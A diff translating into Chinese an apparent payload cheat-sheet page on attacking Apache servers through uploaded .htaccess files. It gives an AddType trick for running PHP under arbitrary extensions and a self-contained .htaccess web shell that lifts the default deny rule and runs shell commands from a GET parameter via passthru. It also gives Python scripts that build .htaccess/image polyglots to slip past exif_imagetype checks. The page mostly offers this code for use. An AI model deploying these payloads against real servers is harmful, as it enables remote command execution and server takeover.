@@ -1,34 +1,35 @@
+[原文文档](README.en.md)
+
 # .htaccess
 
-Uploading an .htaccess file to override Apache rule and execute PHP.
-"Hackers can also use “.htaccess” file tricks to upload a malicious file with any extension and execute it. For a simple example, imagine uploading to the vulnerable server an .htaccess file that has AddType application/x-httpd-php .htaccess configuration and also contains PHP shellcode. Because of the malicious .htaccess file, the web server considers the .htaccess file as an executable php file and executes its malicious PHP shellcode. One thing to note: .htaccess configurations are applicable only for the same directory and sub-directories where the .htaccess file is uploaded."
+上传 .htaccess 文件来覆盖 Apache 规则并执行 PHP。
+"黑客还可以使用 '.htaccess' 文件技巧上传带有任何扩展名的恶意文件并执行它。举一个简单的例子，想象一下向易受攻击的服务器上传一个 .htaccess 文件，该文件具有 AddType application/x-httpd-php .htaccess 配置，并且还包含 PHP shellcode。由于恶意的 .htaccess 文件，Web 服务器将 .htaccess 文件视为可执行的 php 文件并执行其恶意的 PHP shellcode。需要注意的一点是：.htaccess 配置仅适用于 .htaccess 文件上传的同一目录和子目录。"
 
-## Summary
+## 概述
 
-* [AddType Directive](#addtype-directive)
-* [Self Contained .htaccess](#self-contained-htaccess)
-* [Polyglot .htaccess](#polyglot-htaccess)
-* [References](#references)
+* [AddType 指令](#addtype-指令)
+* [自包含 .htaccess](#自包含-htaccess)
+* [混合 .htaccess](#混合-htaccess)
+* [参考文献](#参考文献)
 
-## AddType Directive
+## AddType 指令
 
-Upload an .htaccess with : `AddType application/x-httpd-php .rce`
-Then upload any file with `.rce` extension.
+上传包含以下内容的 .htaccess：`AddType application/x-httpd-php .rce`
+然后上传任何带有 `.rce` 扩展名的文件。
 
-## Self Contained .htaccess
+## 自包含 .htaccess
 
 ```python
-# Self contained .htaccess web shell - Part of the htshell project
-# Written by Wireghoul - http://www.justanotherhacker.com
+# 自包含的 .htaccess 网页 shell - htshell 项目的一部分
+# 由 Wireghoul 编写 - http://www.justanotherhacker.com
 
-# Override default deny rule to make .htaccess file accessible over web
+# 覆盖默认拒绝规则以使 .htaccess 文件可通过 Web 访问
 <Files ~ "^\.ht">
 Order allow,deny
 Allow from all
 </Files>
 
-# Make .htaccess file be interpreted as php file. This occur after apache has interpreted
-# the apache directives from the .htaccess file
+# 使 .htaccess 文件被解释为 php 文件。这在 apache 解释完 .htaccess 文件中的 apache 指令后发生
 AddType application/x-httpd-php .htaccess
 ```
 
@@ -37,13 +38,13 @@ AddType application/x-httpd-php .htaccess
 <?php echo "\n";passthru($_GET['c']." 2>&1"); ?>
 ```
 
-## Polyglot .htaccess
+## 混合 .htaccess
 
-If the `exif_imagetype` function is used on the server side to determine the image type, create a `.htaccess/image` polyglot.
+如果在服务器端使用 `exif_imagetype` 函数来确定图像类型，请创建 `.htaccess/image` 混合文件。
 
-[Supported image types](http://php.net/manual/en/function.exif-imagetype.php#refsect1-function.exif-imagetype-constants) include [X BitMap (XBM)](https://en.wikipedia.org/wiki/X_BitMap) and [WBMP](https://en.wikipedia.org/wiki/Wireless_Application_Protocol_Bitmap_Format). In `.htaccess` ignoring lines starting with `\x00` and `#`, you can use these scripts for generate a valid `.htaccess/image` polyglot.
+[支持的图像类型](http://php.net/manual/en/function.exif-imagetype.php#refsect1-function.exif-imagetype-constants) 包括 [X 位图 (XBM)](https://en.wikipedia.org/wiki/X_BitMap) 和 [WBMP](https://en.wikipedia.org/wiki/Wireless_Application_Protocol_Bitmap_Format)。在 `.htaccess` 中忽略以 `\x00` 和 `#` 开头的行，您可以使用这些脚本来生成有效的 `.htaccess/image` 混合文件。
 
-* Create valid `.htaccess/xbm` image
+* 创建有效的 `.htaccess/xbm` 图像
 
     ```python
     width = 50
@@ -56,7 +57,7 @@ If the `exif_imagetype` function is used on the server side to determine the ima
         htaccess.write(payload)
     ```
 
-* Create valid `.htaccess/wbmp` image
+* 创建有效的 `.htaccess/wbmp` 图像
 
     ```python
     type_header = b'\x00'
@@ -71,8 +72,8 @@ If the `exif_imagetype` function is used on the server side to determine the ima
         htaccess.write(payload)
     ```
 
-## References
+## 参考文献
 
-* [Attacking Webservers Via .htaccess - Eldar Marcussen - May 17, 2011](http://www.justanotherhacker.com/2011/05/htaccess-based-attacks.html)
-* [Protection from Unrestricted File Upload Vulnerability - Narendra Shinde - October 22, 2015](https://blog.qualys.com/securitylabs/2015/10/22/unrestricted-file-upload-vulnerability)
-* [Insomnihack Teaser 2019 / l33t-hoster - Ian Bouchard (@Corb3nik) - January 20, 2019](http://corb3nik.github.io/blog/insomnihack-teaser-2019/l33t-hoster)
+* [通过 .htaccess 攻击 Web 服务器 - Eldar Marcussen - 2011年5月17日](http://www.justanotherhacker.com/2011/05/htaccess-based-attacks.html)
+* [不受限制的文件上传漏洞的保护 - Narendra Shinde - 2015年10月22日](https://blog.qualys.com/securitylabs/2015/10/22/unrestricted-file-upload-vulnerability)
+* [Insomnihack Teaser 2019 / l33t-hoster - Ian Bouchard (@Corb3nik) - 2019年1月20日](http://corb3nik.github.io/blog/insomnihack-teaser-2019/l33t-hoster)
